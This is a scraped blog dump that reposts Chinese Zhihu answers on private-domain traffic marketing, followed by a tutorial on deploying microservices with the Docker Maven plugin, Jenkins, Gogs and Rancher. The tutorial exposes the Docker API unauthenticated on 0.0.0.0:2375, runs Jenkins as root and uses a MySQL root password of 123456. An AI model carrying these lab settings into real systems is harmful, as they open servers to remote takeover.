​ ​ 用通俗一点的例子来解释就是：高铁上卖盒饭！如果车厢是一个私域载体，那每一个站点上来的乘客就都是基于公域到私域的引流。​整个高铁站的乘客，都叫做公域流量。 ​ ​ 乘客从高铁站到车厢，就由公域导入到了私域载体。这个过程称作引流。​引流过后，乘客在各自站点上车，成为私域载体上的一员。 ​ ​ 私域流量集中之后，我们需要对他们进行维护和转化，盒饭是其中一个产品。从上午11点，到下午2点，分时段从第一节车厢到最后一节，来回叫卖，这个过程叫做“触达”。 ​ ​ 理论上，触达是有成本的。但因为集中到了车厢这个私域载体上，卖家每次触达用户，并不需要付出成本。所以，私域的其中一个作用是降低转化成本。 ​ ​ 其二，如果乘客没有集中在车厢里，你每一次想触达客户之前，就都需要向公域流量池支付一定的引流费用。N次触达就需要支付N次引流费用。有了私域之后，我们只需要支付一次公域引流成本。 ​ ​ 再者，由于所有乘客都集中在车厢里，且列车上只有一家卖特定的产品，以及每次触达成本几乎为0。卖家就能在不同时段，不同地域，进行叫卖，以确保无论何时产生的用户需求都能得到充分满足。从而提高用户的利用率。 ​ ​ 用户利用率的提高，对应的就是获客成本的降低，销售额的增加。 ​ ​ 私域在接下来的内循环经济时代，每一家想低成本获客、高利润转化的企业，都不得不面对的一道坎。 ​ ​ 我们再大胆想想，假如你有一个基数为1000的用户私域池子，这里能多产生多少价值？假如你有100个产品，又能增加多少收益？ 事实上，任何一家企业，本质上就是一个私域载体，只是我们暂时没有发现一条路径，去把这些用户转化到线上维护和持续转化。 ​ ​ 另外，要提醒一下，公域和私域，非对立，是融合。企业持续经营，需要看清，私域是长久之计，但私域能够持续的核心，实际上就是公域的持续引流。 ​ ​ 一旦自己建立了体系，就会清楚，很多反智的碎片化内容，其实就是迷惑我们的假象。而真相是，我们必须建立自己的、系统的信息茧房。如此才能不被别人的定义收割。（刘一一，10年引流、文案、私域、变现经验，6年专注知识付费实操，擅长私域体系建立和个人IP打造，，\\/X：sxblyy02） 文章详细url:https://api.zhihu.com/answers/3289505881为什么要做私域流量？内容感谢邀请：为什么要做私域流量？这就要说私域的本质了。 前段时间，我们分享过非常多私域运营技巧和方案，那资料君今天给大家聊聊，私域流量的本质是什么？ 私域运营是一种数字营销策略，其本质是建立和维护与客户、受众或用户的直接关系，以实现品牌建设、用户互动、销售和忠诚度提升等目标。 私域流量指的是来自已建立的、自有的数字平台和渠道的流量，例如品牌的小程序、微信、微信群等。 与之相对的是公域流量，即来自第三方平台和渠道（如各大搜索引擎、抖音快手等自媒体平台等）的流量。 新学运营的伙伴，还在问我，为什么私域运营的载体要选择微信生态？ 因为微信是目前最大的社交媒体平台之一，拥有数以亿计的活跃用户。这个庞大的用户基础为私域运营提供了广阔的市场和潜在的客户群体。 微信提供了多种功能，包括聊天、公众号、小程序、朋友圈等，这些功能可以用于不同类型的私域运营活动。 比如，你可以通过公众号发布内容，通过小程序提供服务，通过朋友圈与客户互动， 同时它提供了许多工具和数据分析功能，帮助你更好地了解你的受众，根据他们的需求和兴趣进行精细化运营，这可以帮助你提供更个性化的服务和产品，提高客户满意度。 再就是，目前的支付功能，微信支付是中国最流行的移动支付方式之一，可以方便地进行线上交易。 这使得在微信上进行私域运营的品牌能够更轻松地实现销售和变现。 什么是私域的本质呢？与客户终身价值有关系吗？ 下面一起来看看： 1.私域本质 私域流量的本质可以总结为以下几点： ①用户拥有权: 私域流量的关键是企业拥有对用户数据和互动的掌控权 ②长期价值: 建立持久的、互惠的关系，以便长期吸引、留住客户，并不断提高他们的价值。这与公域流量通常更侧重于短期转化的特性不同。 ③品牌塑造: 通过自有渠道，传达品牌故事、价值观和个性，以塑造受众对品牌的认知和情感连接。 ④用户参与:在私域里，我们的用户可以通过私聊互动、朋友圈营销、社群交流、会员消费等方式实现。这就有助于建立用户忠诚度和口碑。 ⑤数据驱动决策:在公域数据我们收集不到，但在私域我们就不一样，你可以更好和客户建立联系，获得更多客户画像数据，为每次活动打下数据基础。 私域运营这一战略的目标是降低依赖第三方平台，并在数字营销中建立更加可持续和有利可图的模模式。 在营销里，你是不是也听说客户终身价值。 很肯定的说：未来，客户的终身价值是企业必争之地。 都知道，向现有客户推销比获得新客户要容易得多。每一个销售最不希望的事情就是做一锤子买卖，客户就流失了。 想要解决这种情况的最佳方法之一是了解客户的终身价值。 这样做将帮助我们获得并留住相对高价值的客户，而且随着时间的推移，这也将带来更多的收入。 客户终身价值（Customer Lifetime Value），是客户生命周期价值是一个指标，用来表明在整个业务关系中可以从单个客户合理预期的总收入，该指标考虑到客户给我们持续带来的价值。 平时我们客服话术和销售服务流程直接影响着客户的终身价值指数，如果还不理解这块的重要性，或者不会怎么去做。 那你可以看看： 原文：私域如何打造完整的客户服务流程？5个步骤为你解读！（文末含SOP参考） 私域运营 客户留在一家公司消费的时间越长，他们的终身价值就越大。 正如，你不服务好客户，你就只能不断去找客户。做好私域和客户的终身价值是什么关系呢？ 2.提升客户的终身价值 当你了解了私域运营的本质，我们来聊聊客户的终身价值，我给大家举个例子： 在抖音上认识了王先生，希望获得一个宠物狗的喂养指南，然后通过公域加到我的私域里。 王先生在我私域活动里，购买了189元的狗粮，偶尔发现我还有其他品种的宠物狗，刚好他的朋友李先生要买狗，这时候他把他自己的好友李先生介绍给我了。 李先生通过王先生的转介绍，成功选购走一只宠物狗，这个单我赚了500块。 过了2个星期，李先生也购买了萌宠装饰品，一共消费了900元，又介绍了他爱人的朋友陈女士给我…… 大家可以看看这个过程…… 由王先生这个忠实的客户，给我带来的客户有多少个？ 这个自动转介绍的过程可能还会持续下去…… 为什么会转介绍，因为我给的服务好，产品好，王先生认可了，久而久之我们信任更强了。 所以，私域运营和客户的终身价值之间存在密切关系。 私域运营旨在建立和维护与客户的直接关系，以实现品牌建设、用户互动、销售和忠诚度提升等目标。 这与客户的终身价值密切相关，因为： ①客户忠诚度：通过私域运营，可以更好地与客户建立深度关系。这种关系可以促使客户更加忠诚，他们更有可能多次购买您的产品或服务，从而提高了客户的终身价值。 ②个性化互动：私域运营能够更好地了解客户，从而能够提供更个性化的互动和服务。这种个性化的互动可以增加客户的满意度，使他们更愿意与您保持长期关系。 ③持续价值提升：通过私域运营，可以不断提供有价值的内容、优惠和信息，以吸引客户自动转介绍，再给我们介绍客户来。 这有助于延长客户的生命周期，从而增加了他们的终身价值。 这对于企业的长期成功和可持续增长非常重要。 如果喜欢，可以持续关注我，会陆续为你更新更多干货小知识。 私域：注意力稀缺，新人如何做好社群运营全流程？（文末有SOP领取） 如何打造价值千万的用户数据库？这套私域用户标签体系SOP值得你收藏！ 新手做视频号？这套视频号运营及直播SOP资料值得你收藏（文末领） 企业私域流量池的资源怎么运营？（内含运营SOP） 注意力稀缺，新人如何做好社群运营全流程？（文末有SOP领取） 拉新，转化，再裂变社群话术模板SOP（文末领）。 企业微信优势是什么？（含防封及养号经验） 好了，如觉得本文有帮助，可以点赞加关注（必回关），收藏起来哦。创作不易。感谢你的阅读。 文章详细url:https://api.zhihu.com/answers/3213377848私域流量怎么做转化?内容如何快速建立自己的私域流量底层逻辑，只需要看这篇文章就够了！接下来进入正题：如果要用一句话来概括私域流量的话，那就是：借助一些平台和工具，持续做好引流和服务，最终实现低成本获客、高频率转化、高收益创造和多频次转介绍的一套思想体系！ 注意！私域流量应该是一套思想体系，而不是简单的单点模式。在整个过程中，会涉及到的主要核心点有5个：引流、成交、复购、转介绍和裂变。明白这5个环节之间的关系，就基本上解决了企业（或个人）打造私域体系的链路难点问题。当然，对于很多个人想做私域流量来讲，也必须把自己当做一家企业，这个话题，会在以后跟大家详细拆开来阐述。对于5个核心要点之间，存在什么样的关系？这才是你所重点关注的。引流顾名思义，就是吸引流量。在互联网时代，流量在哪里？我们拿教育行业来举例子，做过市场的朋友会很清楚，我们经常会去小区、学校门口、商超里做地推，通过派送小礼品吸引客户来添加个人微信或留下联系方式。这个链路拆开来就是：公域、诱饵、资源。小区、学校等可以理解为公域流量池；小礼品自然就是诱饵了，而个人微信和联系方式，可以认为是私域池和资源。流量的第一种来源就清楚了，那就是很多很多的公域流量池。比如：知乎、小红书、简书、搜狐自媒体等。而基于私域流量范畴，还有第二种流量来源，我们也可以叫做精准流量来源。依旧拿机构来举例子，我们所有的转介绍客户、直接上门客户、邀约上门未签约客户，实际上都可以认为是精准流量，这些客户，如果仅仅停留在手机号码层面，还不能叫做私域流量。必须把每个手机号转化为微信个人号上的好友，微信公众号上的关注，才能算是进入了我们内部的私域流量体系。解释完这两种来源后，你应该就很清楚。引流就是通过将公域流量和线下门店精准流量转换为私域平台上的一种做法。如何让用户愿意进入我们预设的轨道当中去？就需要我们精心设计流量用户感兴趣的“诱饵”。可以是顾客刚需使用的物品，也可以是一篇有深度的文章，还可以是一系列实用的电子档学习资料……当然，除了这两种常用引流方法以外，还有一些企业会通过付费投放、渠道资源置换、社群加人等方式去引流。流量的吸引和获取，只是完成了私域体系建立的第一步！但也是最关键的一步。产品、流量，是一门生意能够存在的两大关键要素。之所以做私域流量，也是为了使更多低成本获取的流量实现源源不断的成交。成交什么是成交？你的产品（可以是实物，也可以是服务）被你的顾客购买，这就叫做成交！做流量不是为了成交，那还不如将钱投入公益慈善事业 。但要做好成交，也不是这么容易。毕竟，流量离成交还有很长一段距离。这段距离用一个词来概括就是：信任问题。一切成交的基础都是源于信任，这是互联网营销中不变的法则！所以，一切成交的实现，都是在解决信任问题，只要解决了信任问题，成交也就是顺水推舟的事情。也可以这么认为，不购买可以等同于不信任。在之前的文章里有提到过“客户触达”的话题，将客户引导到越多的私域承载体上，理论上来讲，企业触达客户的频次也会越高，成交的概率也会随之增加。这是私域体系能够在信任问题解决上的第一个优势。其次，因为我们将客户承载在不同地方，而每个地方都有一种内容输出和成交方式。比如微信个人号成交，可以有朋友圈静默转化、一对一私聊成交、社群发售转化，每种成交方式的方法和技巧都有所不同。就拿我一个朋友的朋友圈来举例子：他的微信朋友圈，内容非常丰富且多样，有专业知识、实事热点解读、营销广告、产品推介、生活感悟等。这些既是为了做价值输出，也是为了打造个人IP，同时也是解决信任完成成交。除了日常内容维护之外，还有一些基础配套，是我们需要做好的。比如：你的微信昵称辨识度高吗？好友一看就能明白你是做什么的？微信背景作为一个很好的广告位，你有用起来吗？微信上的一句话介绍自己，你还是写着心灵鸡汤吗？当我们去做好这些工作的时候，完成基本成交是没有问题的。但这远远不够……复购成交需要解决信任，复购才能使企业永续存在。一家企业如果没有复购，可以说离死亡也就不远了。复购的好处有很多，比如降低运营成本、优化营销费用、提高单体消费金额等，但还有一个更重要的好处是：客户对企业品牌形象和产品服务的认可。基于私域体系，客户能够复购的前提有两个，一是我们在成交阶段解决的信任问题，一是企业必须建立强大且专业的产品矩阵。这也是大部分私域流量运营者不愿意对外透露的秘密！就如一家餐厅，如果只有一道菜，客户哪怕愿意复购，也会在二三次后离去。而如果你的餐厅里有10道菜，客户能够复购的次数可能是8次、10次……私域流量体系的建立，只是让我们能够更高频、更多次触达客户，而产品矩阵的建立，才是每一位私域流量运营者要去考虑的核心中的核心。产品矩阵这个话题，后期会单独用几篇文章来阐述，这里就不做过多的展开。每一套较为成熟的私域流量体系，都必须能够解决：引流、成交和复购三大环节。转介绍与裂变转介绍和裂变，大部分私域玩家会当做是终局，但我个人更愿意理解为锦上添花！也就意味着，这两者的实施与否，既要考虑流量用户的功能充分挖掘，更需要考虑转介绍和裂变实施过程中的成本与风险把控。所以，这两个模块就放在一起讲讲。转介绍，也可以理解为是一种粉丝的精准裂变。而大面积的裂变，我们会习惯性的认为是1-100、1000、10000的过程，事实上，从1-3-5-8也是一种裂变，只是裂变过程中引发的膨胀效果并没那么大而已。简单的说，裂变也是一种转介绍。客户愿意转介绍的前提也可以归纳为两种，一是用户使用你的产品或服务后，感觉特别好，那么他就会向其他用户进行转介绍。还有一种是，因为你给了用户一定的利益驱动，他自发的分享到朋友圈或其他更多的社群。但转介绍能够触发的核心还是产品和服务过关，其余的都是锦上添花的做法。同样的，为什么做私域流量要重视转介绍和裂变？因为它们可以带来更多的客户，同时还能降低引流成本。当然，因为有口碑价值的输出，也能方便我们快速完成成交。在整个体系中，要做好转介绍和裂变，需要重点做好4个维度的工作。一是产品和服务交付过程中的专业度及细致度；二是企业内部产品矩阵建立时的客群定位延展度；三是小型转介绍和大型裂变过程中的传播路径设计和激励机制建立；四是每次裂变时的风险把控（如：触发封号风险、传播频次把控、加群上限处理等）和结果反馈机制。作为私域体系中的内部再生循环系统，也是私域流量体系中最容易触发风险的一环，在不深入专研各个平台内部规则的情况下，不是太建议去尝试。一旦被封号，得不偿失！什么意思呢？私域流量的前面3个步骤，实际上只要把握一个核心要素：企业被动，客户主动。只要是客户主动添加我们，在大部分情况下是不会触发风险机制。而在裂变过程中，由于实施者本身对各个平台的规则研读不清楚，很容易在毫无知觉的情况下引发封号风险。综合以上内容，我们能够发现：私域流量体系的建立，本质上与实施者的身份无关。不管是老板还是员工，都可以踊跃尝试。尤其是在互联网获客成本越来越高的当下，谁具备低成本获取流量的方法，谁就占有先机！如果能够看懂这篇文章，你做私域流量体系的底层思维就不缺！剩下的就是入局尝试！（刘一一，坚持写作10余年，擅长私域体系建立和个人IP打造，\\/X：sxblyy02） 文章详细url:https://api.zhihu.com/answers/3206062644私域流量和公域流量的区别?内容我曾跟不同行业的专家有过合作，帮他们做抖音、小红书等公域。 我发现：越专业的人，越难做好公域的内容。 第一，专家讲话往往不接地气 专家习惯讲专业概念，默认所有人都知道，但其实，大众比他们想象的要小白的多得多。 不是大众不聪明，而是大众不在专家的领域，没必要也没机会接触到这个概念。 我曾和一位财税专家合作，帮他拍视频。整整3个月，他愣是不愿意把“进项票”这个词改掉。 在他看来，所有老板都应该知道什么叫进项票。 但作为一个学过会计学的小老板，我也是在聊过好多次之后，才理解了进项票的意思，以及怎么用。更别提其他人了。 第二，专家总喜欢讲一些“冷门”话题 很多专家会认为，我分享一些专业的话题，自然就能吸引来那些对这些话题感兴趣的观众。 问题是，这些内容，压根就传不到这些感兴趣的观众那里。 特别是在抖音、小红书，内容全靠算法推荐，当第一波500人不愿意看，你的内容就再也没有流量了。 所以，在公域里，话题越普遍，内容越浅显易懂，越能引起关注。而越是专业的内容，接受度越低。 这也是为什么很多专家，会瞧不起那些流量很大的“明星专家”，说他们不过是哗众取宠。 实际上，他们只是更懂得遵循传播的逻辑罢了。 总之，在公域里，不需要专业，而是要让大家觉得你很专业。 这样你才能吸引到足够多的人，到你的私域里，听你讲一些更深度的话题。 而到了私域，你才需要拿出真本事。特别是在你要成交客户的时候，你需要展示自己第一无二的洞察，来说服你的客户。 —《写篇带货的文章为什么这么难？》 有趣的是，现实中很多人是反着来做的，公域的内容很专业，私域的内容倒是草草了事。 他们把私域的内容，交给了月薪几千的文案，期待他们去成交几千上万的产品或者服务。 然后在看到惨淡的结果后，把责任推给公域，认为还是流量太少，于是加大流量获取，做深公域内容…… 他们宁愿在公域内容上，花上几万、十几万的流量费，却不愿在私域上，花一点小钱，请我们这样专业的私域内容团队。 所以，我才在《卖不出产品，内容再干货，也没有意义》建议到：现在开始，停止写所谓的专业、干货内容，多写转化型内容。 在真正的内容营销者眼里，内容只有两类： 第一类，用户看完很有收获，然后下单付钱； 第二类，用户看完很有收获，但看完也就看完了。 没人会责备写出第二类内容的人，但可惜的是，客户没有因为你的内容好，而最终为你的产品买单。 很多人觉得要写，是想着用干货内容吸引流量，再变现，但其实这里有2个陷阱： 一：写干货内容并不能带来流量 大多数公司的用户，其实非常小众。写给他们看的内容，必然同样小众，这意味着，你的内容不会引起太多的关注。 二：为了流量的干货内容带不来客户 怎样才能带来更多的关注呢？很简单，写爆款文章。 这时来关注你的人，是因为那个“话题”，对你的公司、你的产品，则完全没有兴趣。 当哪天你开始介绍产品的时候，也就是他们取关的时候。 所以，不要再写干货内容了，你不需要别人认可你的文笔好、很专业，你的内容应该只为那些可能愿意为你付费的人而写。 写那些用户看完很有收获，然后下单付钱，或者留下意向信息的内容。 站在业务的角度，再干货的内容，再有价值的分享，没有带来客户，没有把产品卖出去，也没有意义。 — END — 给新朋友的介绍：我是「私域内容雇佣兵」蟹老板，前百万财经号编辑，10W+文章作者，曾用内容获得客户线索1W+，带货1000W+。目前在做一人公司，帮助中小企业做出在私域里吊打同行、拿到业务结果的内容。私信我，雇我给你做私域。 文章详细url:https://api.zhihu.com/answers/3284751160","categories":[{"name":"数据杂烩","slug":"数据杂烩","permalink":"http://blog.ioimp.top/categories/%E6%95%B0%E6%8D%AE%E6%9D%82%E7%83%A9/"}],"tags":[{"name":"私域","slug":"私域","permalink":"http://blog.ioimp.top/tags/%E7%A7%81%E5%9F%9F/"},{"name":"爬虫数据","slug":"爬虫数据","permalink":"http://blog.ioimp.top/tags/%E7%88%AC%E8%99%AB%E6%95%B0%E6%8D%AE/"},{"name":"“知识库备份\"","slug":"“知识库备份","permalink":"http://blog.ioimp.top/tags/%E2%80%9C%E7%9F%A5%E8%AF%86%E5%BA%93%E5%A4%87%E4%BB%BD/"}]},{"title":"持续集成与容器管理","slug":"持续集成与容器管理","date":"2023-11-16T08:44:40.000Z","updated":"2023-11-16T08:54:36.627Z","comments":true,"path":"2023/11/16/持续集成与容器管理/","link":"","permalink":"http://blog.ioimp.top/2023/11/16/%E6%8C%81%E7%BB%AD%E9%9B%86%E6%88%90%E4%B8%8E%E5%AE%B9%E5%99%A8%E7%AE%A1%E7%90%86/","excerpt":"","text":"持续集成与容器管理学习目标： 掌握DockerMaven插件的使用 掌握持续集成工具Jenkins的安装与使用 掌握容器管理工具Rancher的安装与使用 掌握时间序列数据库influxDB的安装与使用 掌握容器监控工具cAdvisor的安装与使用 掌握图表工具Grafana的使用 1 DockerMaven插件微服务部署有两种方法： （1）手动部署：首先基于源码打包生成jar包（或war包）,将jar包（或war包）上传至虚拟机并拷贝至JDK容器。 （2）通过Maven插件自动部署。 对于数量众多的微服务，手动部署无疑是非常麻烦的做法，并且容易出错。所以我们这里学习如何自动部署，这也是企业实际开发中经常使用的方法。 Maven插件自动部署步骤： （1）修改宿主机的docker配置，让其可以远程访问 1vi /lib/systemd/system/docker.service 其中ExecStart&#x3D;后添加配置-H tcp://0.0.0.0:2375 -H unix:///var/run/docker.sock 修改后如下： （2）刷新配置，重启服务 123systemctl daemon-reloadsystemctl restart dockerdocker start registry （3）在工程pom.xml 增加配置 12345678910111213141516171819202122232425262728 &lt;build&gt; &lt;finalName&gt;app&lt;/finalName&gt; &lt;plugins&gt; &lt;plugin&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-maven-plugin&lt;/artifactId&gt; &lt;/plugin&gt; &lt;!-- docker的maven插件，官网：https://github.com/spotify/docker-maven-plugin --&gt; &lt;plugin&gt; &lt;groupId&gt;com.spotify&lt;/groupId&gt; &lt;artifactId&gt;docker-maven-plugin&lt;/artifactId&gt; &lt;version&gt;0.4.13&lt;/version&gt; &lt;configuration&gt; &lt;imageName&gt;192.168.73.135:5000/$&#123;project.artifactId&#125;:$&#123;project.version&#125;&lt;/imageName&gt; &lt;baseImage&gt;jdk1.8&lt;/baseImage&gt; &lt;entryPoint&gt;[&quot;java&quot;, &quot;-jar&quot;, &quot;/$&#123;project.build.finalName&#125;.jar&quot;]&lt;/entryPoint&gt; &lt;resources&gt; &lt;resource&gt; &lt;targetPath&gt;/&lt;/targetPath&gt; &lt;directory&gt;$&#123;project.build.directory&#125;&lt;/directory&gt; &lt;include&gt;$&#123;project.build.finalName&#125;.jar&lt;/include&gt; &lt;/resource&gt; &lt;/resources&gt; &lt;dockerHost&gt;http://192.168.73.135:2375&lt;/dockerHost&gt; &lt;/configuration&gt; &lt;/plugin&gt; &lt;/plugins&gt;&lt;/build&gt; 以上配置会自动生成Dockerfile 123FROM jdk1.8ADD app.jar /ENTRYPOINT [&quot;java&quot;,&quot;-jar&quot;,&quot;/app.jar&quot;] （5）在windows的命令提示符下，进入工程tensquare_parent所在的目录 1mvn install 进入tensquare_base 所在的目录，输入以下命令，进行打包和上传镜像 1mvn docker:build -DpushImage 执行后，会有如下输出，代码正在上传 （6）进入宿主机 , 查看镜像 1docker images 1234REPOSITORY TAG IMAGE ID CREATED SIZE192.168.184.135:5000/tensquare_base 1.0-SNAPSHOT 83efa6b4478c 10 minutes ago 687.9 MB192.168.184.135:5000/jdk1.8 latest 507438a0158f 6 hours ago 584 MBjdk1.8 latest 507438a0158f 6 hours ago 584 MB 输出如上内容，表示微服务已经做成镜像 浏览器访问 http://192.168.73.135:5000/v2/_catalog ，输出 1&#123;&quot;repositories&quot;:[&quot;tensquare_base&quot;]&#125; 浏览器访问 http://192.168.73.135:5000/v2/_catalog ，输出 1&#123;&quot;repositories&quot;:[&quot;tensquare_base&quot;]&#125; （7） 启动容器： 1docker run -di --name=base -p 9001:9001 192.168.73.135:5000/tensquare_base:1.0-SNAPSHOT 2 持续集成工具-Jenkins2.1 什么是持续集成​ 持续集成 Continuous integration ，简称CI ​ 随着软件开发复杂度的不断提高，团队开发成员间如何更好地协同工作以确保软件开发的质量已经慢慢成为开发过程中不可回避的问题。尤其是近些年来，敏捷（Agile） 在软件工程领域越来越红火，如何能再不断变化的需求中快速适应和保证软件的质量也显得尤其的重要。 ​ 持续集成正是针对这一类问题的一种软件开发实践。它倡导团队开发成员必须经常集成他们的工作，甚至每天都可能发生多次集成。而每次的集成都是通过自动化的构建来验证，包括自动编译、发布和测试，从而尽快地发现集成错误，让团队能够更快的开发内聚的软件。 持续集成具有的特点： 它是一个自动化的周期性的集成测试过程，从检出代码、编译构建、运行测试、结果记录、测试统计等都是自动完成的，无需人工干预； 需要有专门的集成服务器来执行集成构建； 需要有代码托管工具支持，我们下一小节将介绍Git以及可视化界面Gogs的使用 持续集成的作用： 保证团队开发人员提交代码的质量，减轻了软件发布时的压力； 持续集成中的任何一个环节都是自动完成的，无需太多的人工干预，有利于减少重复过程以节省时间、费用和工作量； 2.2 Jenkins简介​ Jenkins，原名Hudson，2011年改为现在的名字，它 是一个开源的实现持续集成的软件工具。官方网站：http://jenkins-ci.org/。 ​ Jenkins 能实施监控集成中存在的错误，提供详细的日志文件和提醒功能，还能用图表的形式形象地展示项目构建的趋势和稳定性。 ​ 特点： 易安装：仅仅一个 java -jar jenkins.war，从官网下载该文件后，直接运行，无需额外的安装，更无需安装数据库； 易配置：提供友好的GUI配置界面； 变更支持：Jenkins能从代码仓库（Subversion&#x2F;CVS）中获取并产生代码更新列表并输出到编译输出信息中； 支持永久链接：用户是通过web来访问Jenkins的，而这些web页面的链接地址都是永久链接地址，因此，你可以在各种文档中直接使用该链接； 集成E-Mail&#x2F;RSS&#x2F;IM：当完成一次集成时，可通过这些工具实时告诉你集成结果（据我所知，构建一次集成需要花费一定时间，有了这个功能，你就可以在等待结果过程中，干别的事情）； JUnit&#x2F;TestNG测试报告：也就是用以图表等形式提供详细的测试报表功能； 支持分布式构建：Jenkins可以把集成构建等工作分发到多台计算机中完成； 文件指纹信息：Jenkins会保存哪次集成构建产生了哪些jars文件，哪一次集成构建使用了哪个版本的jars文件等构建记录； 支持第三方插件：使得 Jenkins 变得越来越强大 2.3 Jenkins安装2.3.1 JDK安装（1）将jdk-8u171-linux-x64.rpm上传至服务器（虚拟机） （2）执行安装命令 1rpm -ivh jdk-8u171-linux-x64.rpm RPM方式安装JDK，其根目录为：&#x2F;usr&#x2F;java&#x2F;jdk1.8.0_171-amd64 2.3.2 Jenkins安装与启动（1）下载jenkins 1wget https://pkg.jenkins.io/redhat/jenkins-2.83-1.1.noarch.rpm 或将jenkins-2.83-1.1.noarch.rpm上传至服务器 （2）安装jenkins 1rpm -ivh jenkins-2.83-1.1.noarch.rpm （3）配置jenkins 1vi /etc/sysconfig/jenkins 修改用户和端口 12JENKINS_USER=&quot;root&quot;JENKINS_PORT=&quot;8888&quot; （4）启动服务 1systemctl start jenkins （5）访问链接 http://192.168.184.135:8888 从&#x2F;var&#x2F;lib&#x2F;jenkins&#x2F;secrets&#x2F;initialAdminPassword中获取初始密码串 （6）安装插件 （7）新建用户 完成安装进入主界面 2.4 Jenkins插件安装我们以安装maven插件为例，演示插件的安装 （1）点击左侧的“系统管理”菜单 ,然后点击 （2）选择“可选插件”选项卡，搜索maven，在列表中选择Maven Integration ，点击“直接安装”按钮 看到如下图时，表示已经完成 2.5 全局工具配置2.5.1 安装Maven与本地仓库（1）将Maven压缩包上传至服务器（虚拟机） （2）解压 1tar zxvf apache-maven-3.5.4-bin.tar.gz （3）移动目录 1mv apache-maven-3.5.4 /usr/local/maven （4）编辑setting.xml配置文件vi /usr/local/maven/conf/settings.xml ，配置本地仓库目录,内容如下 1&lt;localRepository&gt;/usr/local/repository&lt;/localRepository&gt; （5）将开发环境的本地仓库上传至服务器（虚拟机）并移动到&#x2F;usr&#x2F;local&#x2F;repository 。 1mv reponsitory_boot /usr/local/repository 执行此步是为了以后在打包的时候不必重新下载，缩短打包的时间。 2.5.2 全局工具配置选择系统管理，全局工具配置 （1）JDK配置 设置javahome为 &#x2F;usr&#x2F;java&#x2F;jdk1.8.0_171-amd64 （2）Git配置 （本地已经安装了Git软件） （3）Maven配置 2.6 代码上传至Git服务器2.6.1 Gogs搭建与配置Gogs 是一款极易搭建的自助 Git 服务。 Gogs 的目标是打造一个最简单、最快速和最轻松的方式搭建自助 Git 服务。使用 Go 语言开发使得 Gogs 能够通过独立的二进制分发，并且支持 Go 语言支持的 所有平台，包括 Linux、Mac OS X、Windows 以及 ARM 平台。 地址：https://gitee.com/Unknown/gogs （1）下载镜像 1docker pull gogs/gogs （2）创建容器 1docker run -di --name=gogs -p 10022:22 -p 3000:3000 -v /var/gogsdata:/data gogs/gogs （3）假设我的centos虚拟机IP为192.168.73.135 在地址栏输入http://192.168.73.135:3000 会进入首次运行安装程序页面，我们可以选择一种数据库作为gogs数据的存储，最简单的是选择SQLite3。如果对于规模较大的公司，可以选择MySQL 点击“立即安装” 这里的域名要设置为centos的IP地址,安装后显示主界面 （4）注册 （5）登录 （6）创建仓库 2.6.2 提交代码步骤： （1）在本地安装git(Windows版本) （2）在IDEA中选择菜单 : File – settings , 在窗口中选择Version Control – Git （3）选择菜单VCS –&gt; Enable Version Control Integration… 选择Git （4）设置远程地址: 右键点击工程选择菜单 Git –&gt; Repository –&gt;Remotes… （5）右键点击工程选择菜单 Git –&gt; Add （6）右键点击工程选择菜单 Git –&gt; Commit Directory… （7）右键点击工程选择菜单 Git –&gt; Repository –&gt; Push … 2.7 任务的创建与执行（1）回到首页，点击新建按钮 .如下图，输入名称，选择创建一个Maven项目，点击OK （2）源码管理，选择Git （3）Build 命令: 1clean package docker:build -DpushImage 用于清除、打包，构建docker镜像 最后点击“保存”按钮 （4）执行任务 3 容器管理工具Rancher3.1 什么是Rancher​ Rancher是一个开源的企业级全栈化容器部署及管理平台。Rancher为容器提供一揽子基础架构服务：CNI兼容的网络服务、存储服务、主机管理、负载均衡、防护墙……Rancher让上述服务跨越公有云、私有云、虚拟机、物理机环境运行，真正实现一键式应用部署和管理。 ​ https://www.cnrancher.com/ 3.2 Rancher安装（1）下载Rancher 镜像 1docker pull rancher/server （2）创建Rancher容器 1docker run -di --name=rancher -p 9090:8080 rancher/server （3）在浏览器输入地址： http://192.168.73.135:9090 即可看到高端大气的欢迎页 点击Got It 进入主界面 （4）切换至中文界面 点击右下角的English 在弹出菜单中选择中文 切换后我们就可以看到亲切的中文界面啦~ 3.3 Rancher初始化3.3.1 添加环境Rancher 支持将资源分组归属到多个环境。 每个环境具有自己独立的基础架构资源及服务，并由一个或多个用户、团队或组织所管理。 例如，您可以创建独立的“开发”、“测试”及“生产”环境以确保环境之间的安全隔离，将“开发”环境的访问权限赋予全部人员，但限制“生产”环境的访问权限给一个小的团队。 （1）选择“Default –&gt;环境管理” 菜单 （2）填写名称，点击“创建”按钮 （3）按照上述步骤，添加十次方测试环境和生产环境 （4）你可以通过点击logo右侧的菜单在各种环境下切换 3.3.2 添加主机（1）选择基础架构–&gt;主机 菜单，点击添加主机 （2）拷贝脚本 （3）在服务器（虚拟机）上运行脚本 （4）点击关闭按钮后，会看到界面中显示此主机。我们可以很方便地管理主机的每个容器的开启和关闭 3.3.3 添加应用点击应用–&gt;全部(或用户) ，点击“添加应用”按钮 填写名称和描述 点击“创建”按钮，列表中增加了新增的应用 3.4 应用部署3.4.1 MySQL部署镜像：centos&#x2F;mysql-57-centos7 增加数据库服务 注意：添加环境变量 MYSQL_ROOT_PASSWORD&#x3D;123456 点击创建按钮，完成创建 上述操作相当于以下docker命令 1docker run -di --name mysql -p 3306:3306 -e MYSQL_ROOT_PASSWORD=123456 centos/mysql-57-centos7 完成后服务列表中存在并且状态为激活 使用SQLyog测试链接，执行建表语句 3.4.2 RabbitMQ部署镜像：rabbitmq:management 端口映射5671 5672 4369 15671 15672 25672 浏览器访问 http://192.168.184.136:15672/ 3.4.3 Redis部署进入应用，点击添加服务，名称redis ，镜像redis ，端口映射6379 创建后使用客户端测试链接 1redis-cli -h 192.168.184.144 测试成功 3.4.4 微服务部署（1）搭建私有仓库 启动私有仓库容器 1docker run -di --name=registry -p 5000:5000 registry 打开浏览器 输入地址http://192.168.184.144:5000/v2/_catalog看到`{&quot;repositories&quot;:[]}` 表示私有仓库搭建成功并且内容为空 修改daemon.json 1vi /etc/docker/daemon.json 添加以下内容，保存退出。 1&#123;&quot;insecure-registries&quot;:[&quot;192.168.184.144:5000&quot;]&#125; （2）修改docker配置，允许远程访问 1vi /lib/systemd/system/docker.service 其中ExecStart&#x3D;后添加配置-H tcp://0.0.0.0:2375 -H unix:///var/run/docker.sock 修改后刷新配置，冲洗服务 123systemctl daemon-reloadsystemctl restart dockerdocker start registry （3）修改微服务工程，添加DockerMaven插件 （4）连接mysql数据库，执行建库脚本 